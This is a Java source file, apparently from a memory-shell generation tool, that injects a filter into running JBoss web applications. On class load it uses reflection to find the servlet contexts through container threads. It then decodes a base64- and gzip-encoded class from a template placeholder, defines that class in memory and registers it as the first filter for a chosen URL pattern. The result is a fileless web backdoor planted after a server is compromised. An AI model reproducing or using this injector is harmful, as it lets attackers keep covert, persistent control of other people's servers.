package com.reajason.javaweb.memsell.jboss.injector;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;


/**
 * @author ReaJason
 */
public class JbossFilterInjector {

    static {
        new JbossFilterInjector();
    }

    public JbossFilterInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getFilter(context);
                addFilter(context, filter);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList<Object>();
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
        try {
            for (Thread thread : threads) {
                if (thread.getName().contains("ContainerBackgroundProcessor")) {
                    Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                    for (Object key : childrenMap.keySet()) {
                        Map<?, ?> children = (Map<?, ?>) getFieldValue(childrenMap.get(key), "children");
                        for (Object key1 : children.keySet()) {
                            Object context = children.get(key1);
                            if (context != null && context.getClass().getName().contains("StandardContext")) {
                                contexts.add(context);
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        return contexts;
    }

    private Object getFilter(Object context) {
        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            filter = classLoader.loadClass(getClassName());
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
            } catch (Throwable e1) {
                e1.printStackTrace();
            }
        }
        return filter;
    }

    @SuppressWarnings("all")
    public void addFilter(Object context, Object filter) throws InvocationTargetException, NoSuchMethodException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        String filterClassName = getClassName();
        try {
            if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{filterClassName}) != null) {
                return;
            }
        } catch (Exception ignored) {
        }
        Object filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
        Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
        try {
            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});
            Constructor<?>[] constructors;
            invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
            constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
            try {
                invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            } catch (Exception e) {
                invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            }

            constructors[0].setAccessible(true);
            try {
                Object filterConfig = constructors[0].newInstance(context, filterDef);
                Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
                filterConfigs.put(filterClassName, filterConfig);
            } catch (Exception e) {
                // 多个应用部分应用通过上下文线程加载 filter 对象，可能在目标应用会加载不到
                if (!(e.getCause() instanceof ClassNotFoundException)) {
                    throw e;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream gzipInputStream = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = gzipInputStream.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    @SuppressWarnings("all")
    public Object getFieldValue(Object obj, String name) throws Exception {
        Field field = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                field = clazz.getDeclaredField(name);
                break;
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field == null) {
            throw new NoSuchFieldException(name);
        } else {
            field.setAccessible(true);
            return field.get(obj);
        }
    }

    public static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;

        Class<?> tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (Method value : methods) {
                        if (value.getName().equals(methodName) && value.getParameterTypes().length == 0) {
                            method = value;
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }
}
